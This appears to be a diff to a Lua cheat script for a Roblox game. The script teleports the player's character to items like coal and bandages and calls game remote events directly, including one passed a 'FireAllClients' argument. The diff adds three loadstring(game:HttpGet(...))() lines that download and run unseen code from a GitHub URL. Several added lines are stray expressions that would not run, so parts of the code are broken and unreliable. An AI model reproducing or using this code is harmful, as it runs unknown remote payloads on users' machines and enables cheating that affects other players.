@@ -335,30 +335,22 @@ createRowButtons({
 
 	end},
 
-	{name = "Coal", action = function()
-		
+{name = "Coal", action = function()
 
+    local player = game.Players.LocalPlayer
+    local hrp = player.Character:WaitForChild("HumanoidRootPart")
 
+    for _, item in ipairs(workspace.Items:GetChildren()) do
+        if item.Name == "Coal" then
+            local capPart = item.PrimaryPart or item:FindFirstChildWhichIsA("BasePart")
+            if capPart then
+                hrp.CFrame = capPart.CFrame + Vector3.new(0, 2, 0)
+                break -- 👈 RẤT QUAN TRỌNG
+            end
+        end
+    end
 
-		local hrp = game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart")
-		local nearest, distance = nil, math.huge
-
-			for _, item in ipairs(workspace.Items:GetChildren()) do
-				if item.Name == "Coal" then
-					local capPart = item.PrimaryPart or item:FindFirstChildWhichIsA("BasePart")
-					if capPart and capPart:IsA("BasePart") then
-						local dist = (capPart.Position - hrp.Position).Magnitude
-						if dist < distance then
-							nearest, distance = capPart, dist
-						end
-					end
-				end
-			end
-			
-			if nearest then
-				hrp.CFrame = nearest.CFrame + Vector3.new(0, 2, 0)
-			end
-	end},
+end},
 
 	{name = "Xăng", action = function()
 			local hrp = game.Players.LocalPlayer.Character.HumanoidRootPart
@@ -881,3 +873,46 @@ local function autoLootAndStore()
 		warn("Không thấy item trong túi sau khi nhặt")
 	end
 end
+
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/TranNhata/shopgametrade99/refs/heads/main/123aa'))()
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/TranNhata/shopgametrade99/refs/heads/main/123'))()
+
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/TranNhata/shopgametrade99/refs/heads/main/1234'))()
+
+
+
+local fuelModel = workspace.Items["Fuel Canister"].Cap
+local bamdage = workspace.Items.Bandage.Tie
+local player = game.Players.LocalPlayer
+local char = player.Character or player.CharacterAdded:Wait()
+local hrp = char:WaitForChild("HumanoidRootPart")
+local luatrai = CFrame.new(1.031, 2.776, 1.113) + Vector3.new(10, 10, 0)
+
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+local CoreGui = game:GetService("CoreGui")
+if true then hrp.CFrame = bamdage.CFrame + Vector3.new(5, 5, 0) end
+
+workspace.Map.Landmarks["Small Tree"].Trunk.CFrame
+workspace.Items["Item Chest"]
+workspace.Items:GetChildren()[112].Coal
+
+
+local args = {
+	game:GetService("Players").LocalPlayer:WaitForChild("Inventory"):WaitForChild("Good Sack"),
+	game:GetService("Players").LocalPlayer:WaitForChild("ItemBag"):WaitForChild("Carrot")
+}
+game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvents"):WaitForChild("RequestBagStoreItem"):InvokeServer(unpack(args))
+
+local args = {
+	"FireAllClients",
+	"BagGet",
+	{
+		Instance = game:GetService("Players").LocalPlayer.Character:WaitForChild("Head"),
+		Volume = 0.25
+	}
+}
+game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvents"):WaitForChild("RequestReplicateSound"):FireServer(unpack(args))
